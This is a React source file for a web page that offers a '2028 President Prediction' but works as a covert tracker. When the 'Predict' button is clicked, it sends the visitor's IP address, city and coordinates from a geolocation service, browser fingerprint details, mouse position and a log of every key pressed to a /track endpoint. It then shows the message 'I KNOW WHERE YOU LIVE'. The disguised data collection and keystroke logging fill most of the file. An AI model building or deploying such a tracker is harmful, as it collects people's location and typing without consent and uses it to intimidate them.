import React, { useEffect, useState } from 'react';
import axios from 'axios';
import './App.css'; // Importing the CSS file for styling

function App() {
  const [locationData, setLocationData] = useState(null);
  const [timeSpent, setTimeSpent] = useState(0);
  const [startTime, setStartTime] = useState(0);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [keyboardActivity, setKeyboardActivity] = useState([]);
  const [connectionInfo, setConnectionInfo] = useState(null);
  const [performanceMetrics, setPerformanceMetrics] = useState(null);
  const [tracked, setTracked] = useState(false);

  useEffect(() => {
    // Start timer for time spent on page
    setStartTime(Date.now());

    // Get geolocation and IP address using GeoJS
    const getLocationData = async () => {
      try {
        const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
        console.log('Location Data:', response.data);
        setLocationData(response.data);
      } catch (error) {
        console.error('Error fetching location data:', error);
      }
    };

    getLocationData();

    // Get network information
    if (navigator.connection) {
      setConnectionInfo({
        type: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
      });
    }

    // Track mouse movement
    const trackMouseMovement = (e) => {
      setMousePosition({ x: e.clientX, y: e.clientY });
    };
    window.addEventListener('mousemove', trackMouseMovement);

    // Track keyboard activity
    const trackKeyPress = (e) => {
      setKeyboardActivity((prev) => [...prev, e.key]);
    };
    window.addEventListener('keydown', trackKeyPress);

    // Performance metrics: Page load time, FCP, LCP, and CLS
    const trackPerformance = () => {
      const metrics = performance.getEntriesByType('paint');
      const fcp = metrics.find((entry) => entry.name === 'first-contentful-paint');
      const lcp = metrics.find((entry) => entry.name === 'largest-contentful-paint');
      const cls = performance.getEntriesByType('layout-shift');

      setPerformanceMetrics({
        fcp: fcp ? fcp.startTime : null,
        lcp: lcp ? lcp.startTime : null,
        cls: cls.length > 0 ? cls[0].value : null,
      });
    };
    trackPerformance();

    // Set a minimum wait time (e.g., 3 seconds) before sending data
    const timeout = setTimeout(() => {
      setTimeSpent((Date.now() - startTime) / 1000); // Time spent in seconds
    }, 3000); // Wait for at least 3 seconds

    return () => {
      clearTimeout(timeout); // Cleanup the timeout on component unmount
      window.removeEventListener('mousemove', trackMouseMovement);
      window.removeEventListener('keydown', trackKeyPress);
    };
  }, [startTime]);

  // Function to send tracking data when the button is clicked
  const sendData = async () => {
    const data = {
      browser: navigator.userAgent,
      device: navigator.platform,
      language: navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      timezoneOffset: new Date().getTimezoneOffset(),
      localTime: new Date().toLocaleString(),
      connectionType: connectionInfo?.type || 'Unknown',
      connectionDownlink: connectionInfo?.downlink || 'Unknown',
      connectionRTT: connectionInfo?.rtt || 'Unknown',
      mousePosition,
      keyboardActivity,
      performanceMetrics,
      timestamp: new Date().toISOString(),
      ip: locationData?.ip,
      location: locationData?.city
        ? `${locationData.city}, ${locationData.region}, ${locationData.country}`
        : 'Unknown',
      latitude: locationData?.latitude,
      longitude: locationData?.longitude,
      timeSpent: timeSpent,
    };

    try {
      await axios.post('http://localhost:5000/track', data);
      setTracked(true); // Show the tracking confirmation message
      console.log('Data sent');

      // Trigger image download
      const imageUrl = '/img/image.png'; // Path to the image in the public folder
      const link = document.createElement('a');
      link.href = imageUrl;
      link.download = 'prediction.png'; // File name for the download
      link.click(); // Trigger the download
    } catch (error) {
      console.error('Error sending data:', error);
    }
  };

  return (
    <div className="App">
      <div className="header">
        <h1 className="title">2028 President Prediction</h1>
        <p className="subTitle">Click below to predict the future president!</p>
      </div>

      <div className="prediction-container">
        <button className="predict-button" onClick={sendData}>Predict</button>

        {tracked && (
          <div className="tracked-message">
            <p>I KNOW WHERE YOU LIVE</p>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
